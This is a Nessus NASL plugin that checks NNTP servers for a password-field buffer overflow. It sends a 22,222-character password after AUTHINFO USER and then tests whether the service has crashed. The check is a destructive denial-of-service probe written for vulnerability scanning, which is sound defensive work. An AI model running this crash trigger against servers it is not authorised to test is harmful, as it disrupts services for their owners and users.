#
# This script was written by Michel Arboi <mikhail@nessus.org>
#
# It is released under the GNU Public Licence 
#
# Overflow on the user name is tested by cassandra_nntp_dos.nasl
# 
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

if(description)
{
 script_id(17229);
 script_version ("$Revision");
 name["english"] = "NNTP password overflow";
 
 script_name(english:name["english"]);
 desc["english"] = "
Nessus was able to crash the remote NNTP server by sending
a too long password. 
This flaw is probably a buffer overflow and might be exploitable
to run arbitrary code on this machine.

Solution : apply the latest patches from your vendor or
	 use a safer software.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Sends long password to nntpd";
 
 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");

 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service_3digits.nasl", "nntp_info.nasl");
 script_require_ports("Services/nntp", 119);
 exit(0);
}

#
include('global_settings.inc');
include('nntp_func.inc');

port = get_kb_item("Services/nntp");
if(!port) port = 119;
if(! get_port_state(port)) exit(0);

user = get_kb_item("nntp/login");
# pass = get_kb_item("nntp/password");

ready = get_kb_item("nntp/"+port+"/ready");
if (! ready) exit(0);

# noauth = get_kb_item("nntp/"+port+"/noauth");
# posting = get_kb_item("nntp/"+port+"/posting");

s = open_sock_tcp(port);
if(! s) exit(0);

line = recv_line(socket: s, length: 2048);

if (! user) user = "nessus";

send(socket:s, data: strcat('AUTHINFO USER ', user, '\r\n'));
buff = recv_line(socket:s, length:2048);
send(socket:s, data: strcat(crap(22222), '\r\n'));
buff = recv_line(socket:s, length:2048);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(! s) 
{
  security_hole(port);
  exit(0);
}
else
 close(s);

if (report_paranoia > 1 && ! buff)
security_hole(port: port, data:
"The remote NNTP daemon abruptly closes the connection
when it receives a too long password.
It might be vulnerable to an exploitable buffer overflow; 
so a cracker might run arbitrary code on this machine.

*** Note that Nessus did not crash the service, so this
*** might be a false positive.
*** However, if the NNTP service is run through inetd
*** it is impossible to reliably test this kind of flaw.

Solution : apply the latest patches from your vendor,
	 or a safer software.

Risk factor : High");


